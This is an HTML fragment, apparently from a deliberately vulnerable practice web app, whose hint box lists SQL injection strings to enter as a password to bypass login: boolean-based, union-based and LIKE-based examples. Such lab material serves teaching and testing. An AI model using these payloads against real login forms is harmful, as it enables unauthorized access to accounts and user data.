    ...
    <div class="container">
        ...
        <div class="row">
            <div class="col-sm-12">
                <div class="highlight">
                    <pre>
Pass these command as password to get authenticated.
Boolean based, example  <strong>' OR '1' = '1
                        123' OR 'a' <> 'b</strong>

Union based, example    <strong>' union select * from users where '1'='1</strong>
                        
Like based, example     <strong>' or username LIKE 'S%</strong>
            </pre>
                </div>
            </div>
        </div>
